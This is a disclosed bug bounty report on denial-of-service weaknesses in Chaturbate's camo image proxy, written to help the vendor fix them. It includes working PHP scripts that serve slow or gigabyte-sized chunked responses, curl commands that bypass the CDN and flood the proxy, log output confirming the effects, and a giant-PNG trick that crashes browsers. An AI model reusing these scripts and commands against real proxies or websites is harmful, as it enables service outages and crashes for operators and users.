# DoS attacks utilizing camo.stream.highwebmedia.com

## Report Details
- **Report ID**: 507525
- **URL**: https://hackerone.com/reports/507525
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-03-10T20:15:44.641Z
- **Disclosed**: 2019-05-01T14:00:11.297Z

## Reporter
- **Username**: teuvokas
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: chaturbate

## Vulnerability Information
# DoS attacks utilizing camo.stream.highwebmedia.com

## Summary

The asset proxy at `camo.stream.highwebmedia.com` used to embed external images linked by users fails to enforce
  1. a timeout on slow responses if a little data is sent every 10 seconds (a kind of "reverse-slowloris" attack)
  1. a size limit on responses with `Transfer-Encoding: chunked` (i.e. no `Content-Length` header)

Different types of Denial of Service attacks could be launched by utilizing these weaknesses.
 
### Related findings that may be useful in attacks
  1. The caching of responses by the CDN can be disabled
      1. by returning status code 500 for the asset response (instead of 200 OK)
      2. OR by appending a random query string to the https://camo.stream.highwebmedia.com/ URLs
         - this alone could turn the asset proxy to a DoS-proxy for attacking other sites
  1. The CDN can be bypassed altogether by logging the origin IPs of the requests from the asset servers and pointing 
  `camo.stream.highwebmedia.com` requests directly to them  (e.g. `curl https://camo.stream.highwebmedia.com/2ae5... --resolve camo.stream.highwebmedia.com:443:██████████43`)
  1. The asset proxy will follow http redirects to other images 
  1. The asset proxy status page is publicly accessible (https://camo.stream.highwebmedia.com/status)

## Steps to reproduce

### Preparations

* Configure a publicly accessible web server with PHP support and high timeout values. 
* Create `slow.php` that outputs a few kB of data every 9 seconds with `Transfer-Encoding: chunked` and status code 500

```
<?php

ob_end_flush();
header("HTTP/1.1 500 Internal Server Error");
header("Content-Type: image/png");
header("Content-Length: ". 1024 * 1024 * 2);

for($i=0; $i<200; $i++) {
  echo str_pad('hi', 4096, "hiho");
  flush();
  sleep(9);
}
```

* Create `big.php` that outputs lots of data with `Transfer-Encoding: chunked` and status code 500:

```
<?php

ob_end_flush();
header("HTTP/1.1 500 Internal Server Error");
header("Content-Type: image/png");

$total    = 1024**3; // 1G
$buffSize = 1024**2; // 1M
$buff     = str_pad('hi', $buffSize, "hiho");

while($total > 0) {
 echo $buff;
 $total -= $buffSize;
}
```

* Create `big_valid.php` that outputs an extra large valid PNG image (e.g. 457 MB file from https://visibleearth.nasa.gov/view.php?id=73751) with `Transfer-Encoding: chunked`:

```
<?php

ob_end_flush();
header("HTTP/1.1 200 OK");
header("Content-Type: image/png");
readfile("really_big.png");
```  

* Create a White Label and add images to the Homepage intro (or a verified profile html):

```
<img src="http://███████/slow.php">
<img src="http://███/big.php">
<img src="http://█████/big_valid.php">
```

* On the white label front page, the links will be rendered as follows:

```
slow.php:      https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/█████
big.php:       https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/█████████
big_valid.php: https://camo.stream.highwebmedia.com/0f82e8c654f4e58966f574d0f19ead4b71fe2d26/████████
```

### Attacks 

#### 1) Slow requests

* Launch curl to fetch `slow.php` multiple times as background process (here targeting a specific proxy ip, but works OK thru the CDN too)
  
```
$ time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 > /dev/null &
```

* Verify that the requests are still in pending after a while

```
$ jobs
[1]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 > /dev/null &
[2]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/██████ --resolve camo.stream.highwebmedia.com:443:██████32 > /dev/null &
[3]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:████32 > /dev/null &
...
```

* Confirm pending requests from the asset server

```
$ netstat -nt | grep ESTABLISHED | grep -c ████32
20
```

* The requests typically stayed pending close to the 30 min timeout of the asset server, as seen from the nginx access.log (the 1500+ sec is the response time):

```
...
██████████32 - - [10/Mar/2019:19:37:36 +0100] "GET /slow.php HTTP/1.1" 500 301 707302 707136 1549.636 "-" "Camo Asset Proxy 2.5.0" "-"
██████████32 - - [10/Mar/2019:19:38:22 +0100] "GET /slow.php HTTP/1.1" 500 301 727742 727576 1594.828 "-" "Camo Asset Proxy 2.5.0" "-"
████32 - - [10/Mar/2019:19:38:22 +0100] "GET /slow.php HTTP/1.1" 500 301 727742 727576 1594.405 "-" "Camo Asset Proxy 2.5.0" "-"
█████████32 - - [10/Mar/2019:19:41:48 +0100] "GET /slow.php HTTP/1.1" 500 301 819366 819200 1800.059 "-" "Camo Asset Proxy 2.5.0" "-
```

#### 2) Excessive network traffic

* Launch curl to fetch `big.php` a few times as background process 

```
$ time curl -s https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/██████████ > /dev/null & 
```

* With just 3 concurrent curl instances, I was able to reach an outgoing transfer rate of over 600 Mbps from the asset server. Nginx access.log showed the following:

```
████34 - - [10/Mar/2019:19:38:15 +0100] "GET /big.php HTTP/1.1" 500 300 1073742118 1073741949 49.271 "-" "Camo Asset Proxy 2.5.0" "-"
█████40 - - [10/Mar/2019:19:38:23 +0100] "GET /big.php HTTP/1.1" 500 300 1073742145 1073741976 55.455 "-" "Camo Asset Proxy 2.5.0" "-"
█████34 - - [10/Mar/2019:19:38:36 +0100] "GET /big.php HTTP/1.1" 500 300 1073742126 1073741957 68.682 "-" "Camo Asset Proxy 2.5.0" "-"
```

#### 3) Crashing the end-user's browser

* When using a normal browser to go to the white label front page that has the `big_valid.php` PNG embedded (e.g. https://latesty.chaturbate.com), the browser is likely to become unstable or crash. Especially Chrome seems to crash easily with huge PNGs embedded into a web page.
* The CDN will cache the large image file saving bandwidth from the attacker

## Impact

* The slow responses could probably be used exhaust the asset proxy server concurrency limits or available sockets.
* The large downloads could be used to exhaust network capacity or available memory/disk space on the proxy server.
* Embedding large but valid images to user profiles can be used to make the end-user's browsers unstable
* The asset proxy servers could also be used to launch proxied DoS attacks against external web servers, especially those that host large images but do not supply a Content-Length header

## Attachments
No attachments
